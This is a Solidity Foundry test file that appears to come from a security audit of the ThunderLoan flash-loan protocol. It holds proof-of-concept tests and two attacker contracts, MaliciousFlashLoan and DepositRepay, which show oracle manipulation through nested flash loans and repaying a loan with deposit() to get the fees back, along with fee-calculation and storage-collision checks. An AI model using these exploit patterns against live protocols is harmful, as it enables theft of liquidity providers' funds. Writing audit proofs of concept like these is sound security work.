// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { ThunderLoan } from "../../src/protocol/ThunderLoan.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
import { MockTSwapPool } from "../mocks/MockTSwapPool.sol";
import { MockPoolFactory } from "../mocks/MockPoolFactory.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { IFlashLoanReceiver } from "src/interfaces/IFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { AssetToken } from "src/protocol/AssetToken.sol";
import { ThunderLoanUpgraded } from "src/upgradedProtocol/ThunderLoanUpgraded.sol";

contract ThunderLoanTest is Test {

    address liquidityProvider = makeAddr("liquidityProvider");
    address user = makeAddr("user");

    MockFlashLoanReceiver mockFlashLoanReceiver;
    ThunderLoan thunderLoanImplementation;
    MockPoolFactory mockPoolFactory;
    ERC1967Proxy proxy;
    ThunderLoan thunderLoan;

    ERC20Mock weth;
    ERC20Mock tokenA;    

    function setUp() public virtual {
        thunderLoan = new ThunderLoan();
        mockPoolFactory = new MockPoolFactory();

        weth = new ERC20Mock();
        tokenA = new ERC20Mock();

        mockPoolFactory.createPool(address(tokenA));
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(mockPoolFactory));

        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));        
    }    

    function test_erroneous_exchange_rate_updates() public {
        // owner allowing tokenA
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken({
            token: tokenA, 
            allowed: true
        }); 

        // provide liquidity - deposit 1000 ether
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000 ether);
        tokenA.approve(address(thunderLoan), 1000 ether);
        thunderLoan.deposit({
            token: tokenA, 
            amount: 1000 ether
        });
        vm.stopPrank();  

        // ready fees to be paid by user + run flash loan
        vm.startPrank(user);
        tokenA.mint(
            address(mockFlashLoanReceiver), 
            thunderLoan.getCalculatedFee({
                token: tokenA, 
                amount: 100 ether
            })
        );
        thunderLoan.flashloan({
            receiverAddress: address(mockFlashLoanReceiver), 
            token: tokenA, 
            amount: 100 ether, 
            params: ""
        });
        vm.stopPrank();    

        // LP tryna withdraw/redeem shares
        // Note: expectation
        // --> initial deposit = 1000 ether
        // --> fees 0.3% = 0.3 ether + 1000 ether
        // --> expected shares to be returned = 1003.3 ether

        // Note: from log
        // --> shares to be returned = 1003.3009 ether
        // --> why there is 0.0009 ether ???
        vm.prank(liquidityProvider);
        thunderLoan.redeem({
            token: tokenA, 
            amountOfAssetToken: type(uint256).max
        });
    }

    function _setUpContracts() private returns(BuffMockTSwap) {
        // deploy main contract & proxy
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");

        // set up tswap dex
        BuffMockPoolFactory factory = new BuffMockPoolFactory(address(weth));
        BuffMockTSwap pool = BuffMockTSwap(factory.createPool(address(tokenA)));

        // continue for proxy
        // - interact ThunderLoan contract using proxy address
        // - call constructor: initialize
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(factory));

        return pool;
    }

    function test_oracle_manipulation() public {
        // 1. setup contracts - all brand new
        BuffMockTSwap pool = _setUpContracts();

        // 2. fund TSwap (DEX) 
        //    - LP provide liquidity 
        //    - both 100 ether, ratio 1:1
        vm.startPrank(liquidityProvider);
        weth.mint(liquidityProvider, 100 ether);
        tokenA.mint(liquidityProvider, 100 ether);
        weth.approve(address(pool), 100 ether);
        tokenA.approve(address(pool), 100 ether);
        pool.deposit({
            wethToDeposit: 100 ether,
            minimumLiquidityTokensToMint: 1,
            maximumPoolTokensToDeposit: 100 ether,
            deadline: uint64(block.timestamp)
        });

        // Note: checks deposit
        assertEq(
            weth.balanceOf(address(pool)), 
            100 ether,
            "WETH amount deposited by LP"
        );
        assertEq(
            tokenA.balanceOf(address(pool)), 
            100 ether,
            "TokenA amount deposited by LP"
        );
        assertEq(
            pool.balanceOf(liquidityProvider), 
            100 ether,
            "Liquidity tokens minted by LP"
        );
        vm.stopPrank();

        // 3. set allowed token in ThunderLoan by Owner
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);

        // 4. fund thunder loan by LP
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000 ether);
        tokenA.approve(address(thunderLoan), 1000 ether);
        thunderLoan.deposit({
            token: tokenA, 
            amount: 1000 ether
        });
        vm.stopPrank();

        // Note: 
        // summarize a little bit
        // - DEX: 100 ether tokenA
        //        100 ether weth
        // - ThunderLoan: 1,000 ether tokenA

        // setup flash loan
        uint LoanFees = thunderLoan.getCalculatedFee({
            token: tokenA, 
            amount: 100 ether
        });
        MaliciousFlashLoan hacker = new MaliciousFlashLoan({
            _pool: address(pool),
            _thunderLoan: address(thunderLoan),
            _repayAddress: address(thunderLoan.getAssetFromToken(tokenA))
        });

        // start malicious flash loan
        vm.startPrank(user);
        tokenA.mint(address(hacker), 100 ether);
        thunderLoan.flashloan({
            receiverAddress: address(hacker),
            token: tokenA, 
            amount: 50 ether,
            params: ""
        });
        vm.stopPrank();

        console.log("Normal Loan Fee: ", LoanFees);
        console.log("Attacker Loan Fee: ", hacker.FeeOne() + hacker.FeeTwo());
        assertLt(
            hacker.FeeOne() + hacker.FeeTwo(), 
            LoanFees
        );
    }

    function test_using_deposit_instead_of_repay() public {
        // owner allowing tokenA
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken({
            token: tokenA, 
            allowed: true
        }); 

        // provide liquidity - deposit 1000 ether
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000 ether);
        tokenA.approve(address(thunderLoan), 1000 ether);
        thunderLoan.deposit({
            token: tokenA, 
            amount: 1000 ether
        });
        vm.stopPrank();  

        // tryna call deposit instead of repay to pay the fees
        vm.startPrank(user);
        uint LoanFee = thunderLoan.getCalculatedFee({
            token: tokenA, 
            amount: 50 ether
        });
        DepositRepay hacker = new DepositRepay(address(thunderLoan));
        tokenA.mint(address(hacker), LoanFee);
        thunderLoan.flashloan({
            receiverAddress: address(hacker),
            token: tokenA, 
            amount: 50 ether,
            params: ""
        });
        hacker.redeemMoney();
        vm.stopPrank();

        assertGt(
            tokenA.balanceOf(address(hacker)),
            50 ether + LoanFee
        );
    }

    function test_storage_collision() public {
        uint FeesBeforeUpgrade = thunderLoan.getFee();

        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded Upgraded = new ThunderLoanUpgraded();
        // Note:
        // if this fails, adds fallback
        thunderLoan.upgradeToAndCall({
            newImplementation: address(Upgraded),
            data: ""
        });
        vm.stopPrank();

        uint FeesAfterUpgraded = thunderLoan.getFee();

        console.log("Fees Before Upgrade: ", FeesBeforeUpgrade);
        console.log("Fees After Upgraded: ", FeesAfterUpgraded);

    }


}

contract MaliciousFlashLoan is IFlashLoanReceiver {

    ThunderLoan public thunderLoan;
    address public repayAddress;
    BuffMockTSwap public pool;
    bool public attacked;
    uint public FeeOne;
    uint public FeeTwo;

    constructor(address _pool, address _thunderLoan, address _repayAddress) {
        pool = BuffMockTSwap(_pool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /* initiator */,
        bytes calldata /* params */
    ) external returns (bool) {
        if (!attacked) {

            attacked = true;
            FeeOne = fee;
            IERC20(token).approve(address(pool), 50 ether);

            // Tanks the price here by doing swaps
            uint WethAmount = pool.getOutputAmountBasedOnInput({
                inputTokensOrWeth: 50 ether,
                inputTokensOrWethReserves: 100 ether,
                outputTokensOrWethReserves: 100 ether
            });
            pool.swapPoolTokenForWethBasedOnInputPoolToken({
                poolTokenAmount: 50 ether,
                minWeth: WethAmount,
                deadline: block.timestamp
            });

            // do flash loan second time
            // this second time will call this `executeOperation` again
            // which will be executed in the else body below
            thunderLoan.flashloan({
                receiverAddress: address(this), 
                token: IERC20(token), 
                amount: amount, 
                params: ""
            });

            // repay
            IERC20(token).transfer(
                repayAddress, 
                amount + fee
            );

        } else {
            // second flash loan will be done here
            FeeTwo = fee;
            // repay 
            IERC20(token).transfer(
                repayAddress, 
                amount + fee
            );                     
        }
        return true;
    }

}

contract DepositRepay is IFlashLoanReceiver {

    ThunderLoan public thunderLoan;
    AssetToken assetToken;
    address Token;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /* initiator */,
        bytes calldata /* params */
    ) external 
      returns (bool) 
    {
        Token = token;
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));

        IERC20(token).approve(
            address(thunderLoan), 
            amount + fee
        );
        thunderLoan.deposit({
            token: IERC20(token), 
            amount: amount + fee
        });

        return true;
    }

    // once flash loan is done, call deposit function to be the way to 
    // pay the fees ... then call redeem to get the fees paid back
    function redeemMoney() public {
        thunderLoan.redeem({
            token: IERC20(Token), 
            amountOfAssetToken: assetToken.balanceOf(address(this))
        });
    }

}